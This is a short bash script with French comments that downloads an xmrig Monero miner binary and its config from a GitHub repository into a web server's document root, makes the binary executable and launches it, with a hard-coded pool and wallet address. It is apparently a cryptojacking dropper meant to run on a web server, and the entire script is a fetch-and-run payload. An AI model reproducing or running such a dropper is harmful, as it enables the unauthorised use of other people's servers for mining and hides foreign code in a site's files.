#!/bin/bash

# URL du binaire xmrig
XMRIG_URL="https://raw.githubusercontent.com/estebanbecker/monero-mining/main/xmrig"

CONFIG_PATH="/var/www/html/config.json"
CONFIG_URL="https://raw.githubusercontent.com/estebanbecker/monero-mining/main/config.json"

# Chemin local pour le binaire xmrig
XMRIG_PATH="/var/www/html/xmrig"

# Adresse du pool et adresse du portefeuille
POOL_ADDRESS="https://moneroocean.stream/"
WALLET_ADDRESS="48MieRSJv6BSHpoqUYF5Bv6iFkahz6tJvXX8Hw1hYscm8GZgr5vt3PBThEqxkLaTBvh9dFddDsCxMRdMBrd2TbWdFaaKjiQ"

# Télécharger le binaire xmrig
wget -O $XMRIG_PATH $XMRIG_URL
wget -O $CONFIG_PATH $CONFIG_URL

# Rendre le binaire exécutable
chmod +x $XMRIG_PATH

# Lancer le minage
$XMRIG_PATH
